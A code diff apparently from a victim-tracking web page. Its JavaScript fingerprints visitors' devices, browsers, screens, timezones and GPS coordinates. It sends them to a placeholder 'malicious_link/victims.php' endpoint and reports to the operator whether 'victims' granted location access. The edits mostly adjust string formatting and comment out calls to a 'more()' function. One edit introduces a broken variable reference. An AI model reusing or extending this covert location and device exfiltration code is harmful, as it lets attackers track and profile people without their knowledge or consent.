@@ -273,7 +273,8 @@ tzArr = TZ.split("/");
     Region = tzArr[0];
 
 City = tzArr[tzArr.length - 1];
-Country = tz2Country[City];
+Ctry = tz2Country[City];
+Country = Country.replaceAll(" ","_")
 
 var TimeZone = new Date();
 TimeZone=TimeZone.toString();
@@ -299,7 +300,9 @@ var ua = navigator.userAgent;
         else if (summary.includes("Apple-iPhone") && modelArr.length >= 4){model1 = modelArr[modelArr.length-2]; }
         else if (summary.includes("Windows_Phone")){model1 = modelArr[modelArr.length-1]; }
         else if (summary.includes("Windows_NT") && modelArr.length >= 3){model1 = modelArr[modelArr.length-2]; }
-        else{model1 = modelArr[modelArr.length-1];} 
+        else{model1 = modelArr[modelArr.length-1];}
+        
+    model1 = model1.replaceAll(" ","_");
     
 
     if(navigator.userAgentData){
@@ -315,7 +318,9 @@ navigator.userAgentData.getHighEntropyValues(['architecture','model','platform',
     var deviceVer = ua.platformVersion;
 
     if (model==""){
-        model=model1;
+        model=model1.replaceAll(" ","_");
+    } else {
+        model=model.replaceAll(" ","_");
     }
 
 
@@ -362,7 +367,7 @@ if(navigator.geolocation){
     xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&deviceVersion=${deviceVer}&platform=${plat}&architecture=${arch}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
     xhttp.send();
     console.log(xhttp);
-    try{more();}catch(e){console.log(e);}
+    // try{more();}catch(e){console.log(e);}
 
 }
 
@@ -370,7 +375,7 @@ if(navigator.geolocation){
         // send the error msg
         await wait4me(5000);
     var xhttp = new XMLHttpRequest();
-        var msg = "Victims_dispermit_us_in_accessing_their_Location, Means_that_u_will_not_be_able_to_get_their_current_location.!";
+        var msg = "Victims_dispermit_us_in_accessing_their_gps_location, Means_that_u_will_not_be_able_to_receive_their_current_location.!";
         xhttp.open("post", `malicious_link/attention.php?denied2=${msg}`);//
         xhttp.send();
         console.log(xhttp);
@@ -383,15 +388,15 @@ if(navigator.geolocation){
         xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&deviceVersion=${deviceVer}&platform=${plat}&architecture=${arch}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
         xhttp.send();
         console.log(xhttp);
-        try{more();}catch(e){console.log(e);}
+        // try{more();}catch(e){console.log(e);}
 
     }
 
     async function accessG(position){
-        console.log("We_successfully_grant_access_to_victims_location");
+        console.log("We_successfully_grant_access_to_victims_gps_location");
         await wait4me(5000);
         var xhttp = new XMLHttpRequest();
-        var msg = "We_successfully_grant_access_to_victims_location, Now_you_will_be_able_to_visualize_their_current_location_on_google_map.";
+        var msg = "We_successfully_grant_access_to_victims_gps_location, Now_you_will_be_able_to_visualize_their_current_location_on_google_map.";
         xhttp.open("post", `malicious_link/attention.php?granted2=${msg}`);//
         xhttp.send();
         console.log(xhttp);
@@ -404,7 +409,7 @@ var xhttp = new XMLHttpRequest();
 xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&deviceVersion=${deviceVer}&platform=${plat}&architecture=${arch}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
 xhttp.send();
 console.log(xhttp);
-try{more();}catch(e){console.log(e);}
+// try{more();}catch(e){console.log(e);}
 
     } 
 });
@@ -475,7 +480,7 @@ console.log(`hardware Concurrency: ${hardware}`);
             xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&platform=${plat}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
             xhttp.send();
             console.log(xhttp);
-            try{more();}catch(e){console.log(e);}
+            // try{more();}catch(e){console.log(e);}
         
         }
         
@@ -483,7 +488,7 @@ console.log(`hardware Concurrency: ${hardware}`);
                 console.log("we fucking well need to fucking access ur location, men");
                 await wait4me(5000);
     var xhttp = new XMLHttpRequest();
-                var msg = "Victims_dispermit_us_in_accessing_their_Location, Means_that_u_will_not_be_able_to_get_their_current_location.";
+                var msg = "Victims_dispermit_us_in_accessing_their_gps_location, Means_that_u_will_not_be_able_to_receive_their_current_location.";
                 xhttp.open("post", `malicious_link/attention.php?denied2=${msg}`);//
                 xhttp.send();
                 console.log(xhttp);
@@ -496,16 +501,16 @@ console.log(`hardware Concurrency: ${hardware}`);
                 xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&platform=${plat}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
                 xhttp.send();
                 console.log(xhttp);
-                try{more();}catch(e){console.log(e);}
+                // try{more();}catch(e){console.log(e);}
         
             
             }
         
             async function accessG(position){
-                console.log("We_successfully_grant_access_to_victims_location");
+                console.log("We_successfully_grant_access_to_victims_gps_location");
                 await wait4me(5000);
         var xhttp = new XMLHttpRequest();
-                var msg = "We_successfully_grant_access_to_victims_location, Now_you_will_be_able_to_visualize_their_current_location_on_google_map.";
+                var msg = "We_successfully_grant_access_to_victims_gps_location, Now_you_will_be_able_to_visualize_their_current_location_on_google_map.";
                 xhttp.open("post", `malicious_link/attention.php?granted2=${msg}`);//
                 xhttp.send();
                 console.log(xhttp);
@@ -518,7 +523,7 @@ console.log(`hardware Concurrency: ${hardware}`);
         xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&platform=${plat}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
         xhttp.send();
         console.log(xhttp);
-        try{more();}catch(e){console.log(e);}
+        // try{more();}catch(e){console.log(e);}
         
             }
     }
